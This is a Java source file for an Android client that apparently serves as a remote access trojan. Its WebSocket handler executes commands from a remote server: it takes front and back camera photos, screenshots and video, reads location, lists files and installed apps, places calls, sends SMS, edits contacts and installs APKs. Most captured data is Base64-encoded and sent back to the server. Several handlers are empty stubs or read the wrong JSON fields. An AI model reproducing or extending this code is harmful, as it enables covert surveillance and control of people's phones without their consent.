package com.ot.grhq.client;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.Location;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Phone;
import com.ot.grhq.client.functionality.SMS;
import com.ot.grhq.client.functionality.Screenshot;

import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.util.List;
import java.util.Map;

public class WebSocketClient extends org.java_websocket.client.WebSocketClient {

    private Context context;

    public WebSocketClient(Context context, URI serverUri) {
        super(serverUri);
        this.context = context;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {

    }

    @Override
    public void onMessage(String message) {
        Log.d("eeee", message);
        try {
            sendResponse("client", "non nuk");
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
        try {
            JSONObject req = new JSONObject(message);

            JSONObject json = new JSONObject();
            json.put("type", "client");
            json.put("id", "");

            byte[] data = null;
            File file = null;
            String path = null;
            Command cmd = Command.valueOf(req.optString("cmd"));

            switch (cmd) {
                case CALL:
                    Phone.call(context, json.getString("number"));
                    break;
                case CAMERA_BACK:
                    path = Screenshot.captureImage(context, false);
                    data = getFileContent(path);
                    file = new File(path);
                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                    json.put("res", "image");
                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case CAMERA_FRONT:
                    path = Screenshot.captureImage(context, true);
                    data = getFileContent(path);
                    file = new File(path);
                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                    json.put("res", "image");
                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case DELETE_CONTACT:
                    Phone.deleteContact(json.getString("name"), json.getString("number"));
                    break;
                case DOWNLOAD_FILE:
                    break;
                case INSTALL_APK:
                    PackageManager.installApp(context, json.getString("path"));
                    break;
                case LAUNCH_APP:
                    PackageManager.launchApp(context, json.getString("package"));
                    break;
                case LIST_INSTALLED_APPS:
                    Map<String, String> apps = PackageManager.getInstalledApps(context);
                    sendResponse("app_list", mapToJson(apps).toString());
                    break;
                case LIST_FILES:
                    List<String> files = FileManager.listFiles(json.getString("path"));
                    sendResponse("files", files.toString());
                    break;
                case LOCATION:
                    json = Location.getLastKnownLocation(context);
                    long timestamp = System.currentTimeMillis();
                    json.put("timestamp", timestamp);
                    json.put("res", "location");
                    send(json.toString());
                    break;
                case READ_CONTACTS:
                    break;
                case SCREENSHOT:
                    path = Screenshot.captureScreen(context);
                    data = getFileContent(path);
                    file = new File(path);
                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                    json.put("res", "screenshot");
                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case TEXT:
                    SMS.send(json.getString("name"), json.getString("number"));
                    break;
                case UPLOAD_FILE:
                    break;
                case VIDEO:
                    path = Screenshot.captureVideo(context, req.getInt("duration"));
                    data = getFileContent(path);
                    file = new File(path);
                    json.put("data", Base64.encode(data, Base64.DEFAULT));
                    json.put("res", "video");
                    json.put("filename", Base64.encode(file.getName().getBytes(), Base64.DEFAULT));
                    json.put("timestamp", file.getName().split(".")[0]);
                    send(json.toString());
                    break;
                case WRITE_CONTACT:
                    Phone.addContact(context, json.getString("name"), json.getString("number"));
                    break;
                default:
                    break;
            }
        } catch (JSONException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {

    }

    @Override
    public void onError(Exception ex) {

    }

    private void sendResponse(String responseType, String data) throws JSONException {
        JSONObject json = new JSONObject();
        json.put("type", "client");
        json.put("res", responseType);
        json.put("data", Base64.encode(data.getBytes(), Base64.DEFAULT));

        send(json.toString());
    }

    private JSONObject mapToJson(Map<String, String> map) {
        JSONObject jsonObject = new JSONObject();

        // Iterate through the map entries and add them to the JSONObject
        for (Map.Entry<String, String> entry : map.entrySet()) {
            try {
                jsonObject.put(entry.getKey(), entry.getValue());
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        return jsonObject;
    }

    private byte[] getFileContent(String path) throws IOException {
        byte[] data = null;

        File file = new File(path);
        if (file.exists()) {
            FileInputStream fileInputStream = new FileInputStream(file);
            data = new byte[(int) file.length()];
            fileInputStream.read(data);
            fileInputStream.close();
        }

        return data;
    }
}
